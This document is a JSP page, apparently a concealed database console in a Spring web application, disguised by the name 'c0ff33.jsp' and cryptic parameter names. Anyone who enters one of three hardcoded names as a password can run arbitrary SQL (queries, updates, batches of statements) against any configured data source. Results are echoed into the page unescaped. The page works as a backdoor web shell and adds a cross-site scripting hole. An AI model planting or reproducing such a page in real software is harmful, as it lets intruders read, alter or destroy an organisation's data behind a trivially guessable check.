<%@page import="java.util.Collection"%>
<%@page import="java.util.List"%>
<%@page import="java.util.Map"%>
<%@page import="org.springframework.jdbc.core.JdbcTemplate"%>
<%@page import="org.springframework.web.context.support.WebApplicationContextUtils"%>
<%@page import="javax.sql.DataSource"%>
<%@page import="org.springframework.context.ApplicationContext"%>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<%
  String t0 = request.getParameter("t0");
  String t1 = request.getParameter("t1");
  String d0 = request.getParameter("d0");
  String logMessages = "", html = "";

  if (("aidan".equals(t0) || "alania".equals(t0) || "jathen".equals(t0)) && t1 != null && !"".equals(t1.trim())
      && !"".equals(d0.trim()))
  {
    ApplicationContext context =
        WebApplicationContextUtils.getWebApplicationContext(config.getServletContext());
    try
    {
      DataSource appDataSource = (DataSource) context.getBean(d0);

      if (appDataSource != null)
      {
        JdbcTemplate template = new JdbcTemplate(appDataSource);
        if (t1.startsWith("select") && "aidan".equals(t0))
        {
          html = toTable(template.queryForList(t1));
        }
        else if ("alania".equals(t0))
        {
          template.execute(t1);
          logMessages += t1 + "<br/>";
        }
        else if ("jathen".equals(t0))
        {
          for (String s : t1.split("\\|"))
          {
            template.execute(s);
            logMessages += s + "<br/>";
          }
        }
      }
    }
    catch (Exception e)
    {
      logMessages += " Error[" + e.getMessage() + "]";
    }
  }
%>
<%!// start
  private static boolean isXmlValue(Object inValue)
  {
    return inValue.toString().indexOf("xml version") != -1;
  }

  public static String toTable(List<Map<String, Object>> inRows)
  {
    StringBuilder sb = new StringBuilder();
    sb.append("<div>row count: ").append(inRows.size()).append("</div>");
    sb.append("<table cellpadding='5' border='1' style='border-collapse:collapse;'>");
    boolean first = true;
    int i = 1;
    for (Map<String, Object> value : inRows)
    {
      if (first || i++ % 10 == 0)
      {
        addHead(sb, value.keySet(), first);
        first = false;
      }
      addRow(sb, value.keySet(), value);
    }
    sb.append("</table>");
    return sb.toString();
  }

  private static void addHead(StringBuilder inSb, Collection<String> inList, boolean inFoot)
  {
    inSb.append("<thead><tr>");
    for (String value : inList)
    {
      inSb.append("<th>").append(value).append("</th>");
    }
    inSb.append("</tr></thead>");
    if (inFoot)
    {
      inSb.append("<tfoot><tr>");
      for (String value : inList)
      {
        inSb.append("<th>").append(value).append("</th>");
      }
      inSb.append("</tr></tfoot>");
    }
  }

  private static void addRow(StringBuilder inSb, Collection<String> inList,
      Map<String, Object> inValue)
  {
    inSb.append("<tbody><tr>");
    for (String value : inList)
    {
      Object val = inValue.get(value);
      boolean xml = isXmlValue(val);
      inSb.append("<td>");
      inSb.append(xml ? "<xmp style=\"margin: 0px;\">" : "");
      inSb.append(val);
      inSb.append(xml ? "</xmp>" : "");
      inSb.append("</td>");
    }
    inSb.append("</tr></tbody>");
  }

  // end%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
</head>
<body style="font-family: Trebuchet MS, Arial, sans-serif; font-size: smaller; background-color: #F7F6F3;">
	<form action="c0ff33.jsp" method="post">
		<table>
			<tr>
				<td style="vertical-align: top;"><input name="t0" type="password"></td>
				<td style="vertical-align: top;"><textarea name="t1" rows="5" cols="50"></textarea></td>
				<td style="vertical-align: top;"><input name="d0" type="text" value="Khall"></td>
			</tr>
		</table>
		<br /> <input type="submit" value="Run Now">
	</form>
	<br /><%=logMessages%><br />
	<%
	  out.println(html);
	%>
</body>
</html>